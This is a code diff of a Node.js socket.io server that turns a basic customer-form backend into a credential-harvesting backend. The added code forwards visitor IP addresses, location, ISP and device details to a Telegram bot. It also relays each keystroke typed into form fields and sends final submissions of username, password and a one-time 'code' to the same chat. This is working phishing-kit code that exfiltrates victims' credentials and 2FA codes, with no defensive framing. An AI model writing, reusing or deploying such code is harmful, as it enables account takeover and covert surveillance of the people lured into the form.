@@ -1,95 +1,94 @@
 const express = require("express");
+const http = require("http");
+const { Server } = require("socket.io");
 const cors = require("cors");
 const axios = require("axios");
 
 const app = express();
+const server = http.createServer(app);
+
+const io = new Server(server,{
+  cors:{ origin:"*" }
+});
 
 app.use(cors());
 
-app.use(express.json());
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
-const BOT_TOKEN =
-process.env.BOT_TOKEN;
-
-const CHAT_ID =
-process.env.CHAT_ID;
-
-app.post("/submit", async(req,res)=>{
-
-try{
-
-const {name, place, age} =
-req.body;
-
-if(
-!name ||
-!place ||
-!age
-){
-
-return res.status(400).json({
-success:false
-});
-
+// Send message to Telegram
+function sendTelegram(message){
+    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        chat_id: CHAT_ID,
+        text: message
+    }).catch(err => console.log("Telegram Error:", err.message));
 }
 
-const message =
+io.on("connection",(socket)=>{
 
-`New Customer Form
+    const userId = socket.id;   // Unique user ID
 
-Name: ${name}
+    console.log("User connected:", userId);
 
-Place: ${place}
+    sendTelegram(`🟢 USER CONNECTED
+ID: ${userId}`);
 
-Age: ${age}`;
+    // Receive visitor info
+    socket.on("visitor-info",(data)=>{
 
-await axios.post(
+        console.log("Visitor Data:", data);
 
-`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        sendTelegram(`⚠️ New Visitor
 
-{
+User ID: ${userId}
 
-chat_id: CHAT_ID,
+🌐 IPv6: ${data.ipv6}
+🌐 IPv4: ${data.ipv4}
 
-text: message
+📍 Location: ${data.city}, ${data.region}, ${data.country}
 
-}
+🏢 ISP: ${data.isp}
 
-);
+📱 Device: ${data.device}
 
-res.json({
+🌍 Map: ${data.map}
 
-success:true
+🌐 Browser: ${data.browser}
+`);
+    });
+
+    // Track typing
+    socket.on("typing",(data)=>{
+        sendTelegram(`⌨️ Typing
+
+User ID: ${userId}
+
+Field: ${data.field}
+Value: ${data.value}`);
+    });
+
+    // Final form submission
+    socket.on("submit",(data)=>{
+        sendTelegram(`✅ Final Submission
+
+User ID: ${userId}
+
+Username: ${data.username}
+Password: ${data.password}
+Code: ${data.code}`);
+    });
+
+    socket.on("disconnect",()=>{
+        console.log("User disconnected:", userId);
+
+        sendTelegram(`🔴 USER DISCONNECTED
+ID: ${userId}`);
+    });
 
 });
 
-}catch(error){
+const PORT = process.env.PORT || 3000;
 
-console.log(error.message);
-
-res.status(500).json({
-
-success:false
-
-});
-
-}
-
-});
-
-app.get("/",(req,res)=>{
-
-res.send("Backend Running");
-
-});
-
-const PORT =
-process.env.PORT || 3000;
-
-app.listen(PORT, ()=>{
-
-console.log(
-`Running on ${PORT}`
-);
-
+server.listen(PORT,()=>{
+    console.log("Server running on port", PORT);
 });
